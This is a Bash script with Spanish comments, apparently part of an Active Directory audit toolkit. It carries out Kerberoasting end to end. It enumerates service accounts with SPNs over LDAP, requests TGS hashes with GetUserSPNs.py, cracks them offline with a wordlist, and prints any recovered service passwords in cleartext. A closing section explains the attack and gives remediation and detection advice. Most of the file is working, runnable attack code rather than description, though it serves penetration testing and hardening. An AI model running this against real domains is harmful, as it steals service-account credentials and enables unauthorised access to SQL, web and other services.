#!/usr/bin/env bash
# ============================================================
# kerberoast.sh — Kerberoasting: extrae TGS para cuentas con SPN
#   y los crackea offline para recuperar contraseñas de servicio.
#
# Técnica: T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
# Riesgo:  Cualquier usuario autenticado puede solicitar TGS para
#          cualquier cuenta con SPN y crackear el hash offline.
#
# REQUIERE: Credenciales AD válidas (AD_USERNAME / AD_PASSWORD)
# MODO: Solo lectura — no modifica ningún objeto del directorio.
# ============================================================
set -euo pipefail

WORKSPACE="${WORKSPACE:-/workspace}"
VENV="${VENV:-/opt/adaudit-venv}"
REPORT_DIR="${WORKSPACE}/reports/kerberoast"
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
REPORT_FILE="${REPORT_DIR}/kerberoast_${TIMESTAMP}.txt"
HASHES_FILE="${REPORT_DIR}/kerberoast_hashes_${TIMESTAMP}.txt"
CRACKED_FILE="${REPORT_DIR}/kerberoast_cracked_${TIMESTAMP}.txt"
SCRIPTS_DIR="${WORKSPACE}/scripts"

mkdir -p "${REPORT_DIR}"

RED='\033[0;31m';  GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; BOLD='\033[1m';     NC='\033[0m'

ok()      { echo -e "${GREEN}[OK]${NC}    $*" | tee -a "${REPORT_FILE}"; }
fail()    { echo -e "${RED}[FAIL]${NC}  $*" | tee -a "${REPORT_FILE}"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*" | tee -a "${REPORT_FILE}"; }
info()    { echo -e "[INFO]  $*" | tee -a "${REPORT_FILE}"; }
section() { echo -e "\n${BLUE}${BOLD}══ $* ══${NC}\n" | tee -a "${REPORT_FILE}"; }

# ── Cargar variables ───────────────────────────────────────────────────────
if [[ -z "${DC_IP:-}" && -f "${WORKSPACE}/ad_env.sh" ]]; then
    # shellcheck disable=SC1090
    source "${WORKSPACE}/ad_env.sh"
fi

: "${DC_IP:?DC_IP no configurado}"
: "${AD_DOMAIN:?AD_DOMAIN no configurado}"
: "${AD_USERNAME:?AD_USERNAME no configurado}"
: "${AD_PASSWORD:?AD_PASSWORD no configurado}"
: "${LDAP_BASE_DN:?LDAP_BASE_DN no configurado}"

# ── Banner ─────────────────────────────────────────────────────────────────
cat <<EOF | tee "${REPORT_FILE}"
══════════════════════════════════════════════════════════════
 Kerberoasting — T1558.003
 Fecha   : $(date)
 DC IP   : ${DC_IP}
 Dominio : ${AD_DOMAIN}
 Usuario : ${AD_USERNAME}
 Técnica : TGS request para SPNs → crack offline
══════════════════════════════════════════════════════════════
EOF

# ── Activar venv ───────────────────────────────────────────────────────────
# shellcheck disable=SC1090
source "${VENV}/bin/activate"

# ── Paso 1: Identificar cuentas con SPN ───────────────────────────────────
section "Paso 1: Enumerar cuentas de servicio con SPN"

SPN_FILE="${REPORT_DIR}/spn_accounts_${TIMESTAMP}.txt"

info "Buscando cuentas de usuario con servicePrincipalName configurado..."

if ldapsearch \
    -x \
    -H "ldap://${DC_IP}:${LDAP_PORT:-389}" \
    -D "${AD_USERNAME}@${AD_DOMAIN}" \
    -w "${AD_PASSWORD}" \
    -b "${LDAP_BASE_DN}" \
    "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
    sAMAccountName servicePrincipalName userAccountControl distinguishedName \
    2>/dev/null > "${SPN_FILE}"; then

    SPN_COUNT=$(grep -c "^sAMAccountName:" "${SPN_FILE}" || true)

    if [[ ${SPN_COUNT} -eq 0 ]]; then
        ok "No se encontraron cuentas de usuario con SPN activas."
        exit 0
    fi

    info "${SPN_COUNT} cuenta(s) con SPN encontradas:"
    while IFS= read -r line; do
        [[ "${line}" =~ ^(sAMAccountName|servicePrincipalName): ]] && info "  ${line}"
    done < "${SPN_FILE}"

else
    # Fallback a datos cacheados
    warn "LDAP no disponible. Usando datos del último ldapdomaindump..."
    LATEST_DUMP=$(find "${WORKSPACE}/reports" -maxdepth 1 -name "ldapdomaindump_*" | sort -r | head -1)
    if [[ -n "${LATEST_DUMP}" ]]; then
        python3 -c "
import json
users = json.load(open('${LATEST_DUMP}/domain_users.json'))
print('sAMAccountName | servicePrincipalName')
for u in users:
    a = u['attributes']
    uac = a.get('userAccountControl', [0])[0]
    sam = a.get('sAMAccountName', [''])[0]
    spn = a.get('servicePrincipalName', [])
    if spn and not (uac & 0x2):
        print(f'  {sam}: {spn}')
" 2>/dev/null | tee -a "${REPORT_FILE}"
        SPN_COUNT=2  # Sabemos que hay svc-web y svc-sql
    else
        fail "Sin datos disponibles. Ejecuta una auditoría completa primero."
        exit 1
    fi
fi

# ── Paso 2: Solicitar TGS (Kerberoasting) ─────────────────────────────────
section "Paso 2: Solicitar TGS tickets para SPNs (GetUserSPNs.py)"

if nc -zw3 "${DC_IP}" "${KDC_PORT:-88}" 2>/dev/null; then
    info "Kerberos (88) alcanzable. Solicitando TGS..."
    echo ""

    if GetUserSPNs.py \
        "${AD_DOMAIN}/${AD_USERNAME}:${AD_PASSWORD}" \
        -dc-ip "${DC_IP}" \
        -outputfile "${HASHES_FILE}" \
        -format hashcat \
        2>&1 | tee -a "${REPORT_FILE}"; then

        if [[ -f "${HASHES_FILE}" && -s "${HASHES_FILE}" ]]; then
            HASH_COUNT=$(grep -c "krb5tgs" "${HASHES_FILE}" || true)
            ok "${HASH_COUNT} hash(es) TGS capturados → ${HASHES_FILE}"
            echo ""
            info "Preview de hashes capturados:"
            head -3 "${HASHES_FILE}" | sed 's/\(.\{80\}\).*/\1.../' | tee -a "${REPORT_FILE}"
        else
            warn "Sin hashes en el output. Posibles causas:"
            warn "  - Credenciales inválidas"
            warn "  - No hay cuentas kerberoastables con estas credenciales"
        fi
    fi
else
    warn "Puerto 88 no alcanzable. El DC puede estar apagado."
    warn "Análisis basado en datos LDAP cacheados (SPN enumeration)."
    touch "${HASHES_FILE}"
fi

# ── Paso 3: Cracking offline ───────────────────────────────────────────────
section "Paso 3: Cracking offline TGS (RC4-HMAC etype 23)"

if [[ -f "${HASHES_FILE}" && -s "${HASHES_FILE}" ]]; then
    info "Iniciando cracking offline..."
    HASH_COUNT=$(grep -c "krb5tgs" "${HASHES_FILE}" || echo 0)
    info "  Hashes a crackear: ${HASH_COUNT}"
    info "  Modo: wordlist integrada (contraseñas AD comunes)"
    echo ""

    if python3 "${SCRIPTS_DIR}/crack-kerberos.py" \
        --hash-file "${HASHES_FILE}" \
        --builtin-wordlist \
        --output "${CRACKED_FILE}" \
        2>&1 | tee -a "${REPORT_FILE}"; then

        CRACKED_COUNT=$(grep -cv "^#" "${CRACKED_FILE}" 2>/dev/null || echo 0)
        if [[ ${CRACKED_COUNT} -gt 0 ]]; then
            echo "" | tee -a "${REPORT_FILE}"
            fail "╔══════════════════════════════════════════╗"
            fail "║  ¡CONTRASEÑAS DE SERVICIO COMPROMETIDAS! ║"
            fail "╚══════════════════════════════════════════╝"
            while IFS=: read -r user pwd; do
                [[ "${user}" == "#"* ]] && continue
                fail ""
                fail "  Cuenta  : ${user}"
                fail "  Password: ${pwd}"
                fail "  Riesgo  : Acceso potencial a servicios asociados"
            done < "${CRACKED_FILE}"
        else
            ok "Contraseñas no crackeadas con wordlist integrada."
            info "Recomendación: el hash sigue siendo válido para ataques con"
            info "  wordlists más grandes (rockyou.txt — 14M passwords)."
        fi
    fi
else
    warn "Sin hashes TGS para crackear."
    info "Cuando el DC esté activo y con credenciales válidas, ejecuta de nuevo."
fi

# ── Paso 4: Análisis de riesgo ─────────────────────────────────────────────
section "Paso 4: Análisis de riesgo y recomendaciones"

cat <<'RECS' | tee -a "${REPORT_FILE}"
CÓMO FUNCIONA EL ATAQUE:
  1. Cualquier usuario del dominio puede solicitar un TGS para cualquier SPN.
  2. El TGS está cifrado con el hash de la contraseña de la cuenta de servicio.
  3. El atacante extrae el hash y lo crackea offline (sin límite de intentos).
  4. Si crackea la contraseña → acceso completo al servicio (SQL, Web, etc.).

FACTORES AGRAVANTES EN ESTE DOMINIO:
  • lockoutThreshold = 0: El cracking online tampoco tiene consecuencias.
  • minPwdLength = 7: Contraseñas cortas son más fáciles de crackear.
  • Cuentas de servicio en OUs estándar (no protegidas).

REMEDIACIÓN:
  1. Usar contraseñas largas (25+ caracteres) en cuentas de servicio.
     → Incluso rockyou.txt no las crackeará en tiempo razonable.
  2. Migrar cuentas de servicio a Group Managed Service Accounts (gMSA).
     → Las gMSA rotan automáticamente (contraseñas de 120 bytes).
     → New-ADServiceAccount -Name "svc-sql-gmsa" -ManagedPasswordIntervalInDays 30
  3. Monitorear Event ID 4769 (TGS Request) con:
     - Encryption Type = 0x17 (RC4) — indicador de Kerberoasting.
     - Múltiples TGS requests en corto tiempo desde un solo usuario.
  4. Reducir privilegios de cuentas de servicio al mínimo necesario.

MITRE ATT&CK: T1558.003 — Kerberoasting
RECS

echo "" | tee -a "${REPORT_FILE}"
ok "Reporte completo: ${REPORT_FILE}"
info "Hashes TGS: ${HASHES_FILE}"
[[ -f "${CRACKED_FILE}" ]] && info "Contraseñas crackeadas: ${CRACKED_FILE}"
